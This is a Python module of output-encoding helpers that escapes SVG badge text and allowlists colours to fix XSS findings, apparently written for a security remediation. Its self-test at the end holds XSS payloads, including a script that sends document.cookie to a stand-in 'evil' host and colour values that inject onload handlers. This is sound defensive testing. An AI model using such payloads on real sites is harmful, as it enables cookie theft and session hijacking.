"""Output-encoding helpers — fixes the XSS / SVG-injection findings.

Covers:
  * vision.creative SVG injection (cursor finding #4, Medium, CWE-79/116)
  * dashboard DOM XSS is fixed in dashboard_safe.js (this module is the
    server-side counterpart for any HTML the kernel emits).

Standard library only.
"""

from __future__ import annotations

import re
from xml.sax.saxutils import escape, quoteattr

# Strict colour allowlist: #rgb / #rrggbb / #rrggbbaa, or a small named set.
_HEX_COLOR = re.compile(r"^#[0-9a-fA-F]{3,8}$")
_NAMED_COLORS = frozenset(
    {"black", "white", "red", "green", "blue", "yellow", "cyan",
     "magenta", "gray", "grey", "orange", "purple", "navy", "teal"}
)


def safe_color(color: str | None, fallback: str = "#3b82f6") -> str:
    """Return ``color`` only if it matches the allowlist, else ``fallback``."""
    if not color:
        return fallback
    c = color.strip()
    if _HEX_COLOR.match(c) or c.lower() in _NAMED_COLORS:
        return c
    return fallback


def svg_badge(text: str, color: str | None = None) -> str:
    """Build a deterministic SVG badge with all inputs XML-escaped/validated.

    Drop-in replacement for the `_svg_badge` / `_creative` body in
    singularity/organs/vision.py. `text` is escaped for the <text> node;
    `color` is validated against an allowlist before entering the attribute.
    """
    safe_text = escape(text or "")
    fill = safe_color(color)
    bwidth = 12 * max(len(text or ""), 4) + 24
    # quoteattr returns the value WITH surrounding quotes — note no extra quotes.
    return (
        f'<svg xmlns="http://www.w3.org/2000/svg" width="{bwidth}" height="36">'
        f"<rect rx=\"6\" width=\"{bwidth}\" height=\"36\" fill={quoteattr(fill)}/>"
        f'<text x="12" y="24" font-family="monospace" font-size="16" fill="#fff">'
        f"{safe_text}</text></svg>"
    )


def escape_html(value: str) -> str:
    """Escape & < > \" ' for safe insertion into HTML text or attributes."""
    return escape(value or "", {'"': "&quot;", "'": "&#39;"})


if __name__ == "__main__":
    payloads = [
        "</text><script>alert(document.cookie)</script>",
        "</text></svg><script>fetch('//evil/'+document.cookie)</script>",
    ]
    for p in payloads:
        out = svg_badge(p, color='red" onload="alert(1)')
        leaked = "<script>" in out or "onload=" in out
        print(("LEAK" if leaked else "safe") + ": " + out[:90] + "...")
    bad_color = svg_badge("ok", color='#000"><script>alert(1)</script>')
    print("color sanitized:", "<script>" not in bad_color)
